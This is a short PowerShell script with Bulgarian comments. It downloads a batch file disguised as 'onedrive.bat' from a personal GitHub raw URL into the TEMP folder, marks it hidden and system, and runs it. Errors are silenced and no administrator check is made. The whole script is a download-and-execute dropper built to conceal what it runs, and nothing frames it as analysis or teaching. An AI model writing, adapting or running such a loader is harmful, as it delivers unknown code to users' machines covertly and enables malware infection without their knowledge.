# Без проверка за администратор → изпълнява се директно с нормални права

$ErrorActionPreference = "SilentlyContinue"

$url  = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
$file = "$env:TEMP\onedrive.bat"

# Изтриваме стара версия ако съществува (не е задължително, но е добра практика)
if (Test-Path $file) { 
    Remove-Item $file -Force -ErrorAction SilentlyContinue 
}

Start-Sleep -Milliseconds 700

Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -UseBasicParsing

Start-Sleep -Milliseconds 1000

if (Test-Path $file) {
    $item = Get-Item $file -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    
    Start-Process $file
}
